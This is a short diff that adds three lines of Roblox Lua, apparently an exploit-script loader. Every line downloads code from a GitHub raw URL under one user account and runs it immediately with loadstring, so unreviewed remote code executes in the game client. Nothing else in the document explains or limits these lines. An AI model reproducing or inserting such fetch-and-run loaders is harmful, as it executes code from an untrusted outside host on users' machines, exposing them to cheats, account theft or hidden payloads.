@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jamal-hub-forniw/MadeByTexoYk/main/MadeByTexoYk"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jamal-hub-forniw/hello/main/jamal"))()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Jamal-hub-forniw/replay/main/MadeByTexoYk'),true))()
